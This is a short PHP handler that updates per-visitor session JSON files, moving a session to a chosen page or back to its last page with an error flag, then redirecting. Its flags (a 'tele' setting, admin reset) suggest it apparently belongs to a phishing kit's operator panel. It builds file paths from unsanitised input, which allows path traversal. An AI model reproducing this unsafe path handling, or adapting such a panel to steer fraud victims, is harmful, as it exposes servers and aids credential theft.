<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !isset($_POST['update_config']) && !isset($_POST['update_tele']) && !isset($_POST['reset_admin']) && !isset($_POST['delete'])) {
    $id = $_POST['id'];
    $page = $_POST['page'];
    $userData = json_decode(file_get_contents("../sessions/$id.json"), true);
    if ($page == 'previous') {
        $userData['page'] = $userData['last_page'];
        $userData['error'] = true;
    } else {
        $userData['page'] = $page;
        $userData['error'] = false;
    }
    file_put_contents("../sessions/$id.json", json_encode($userData));
    header("Location: index.php");
    exit();
}
?>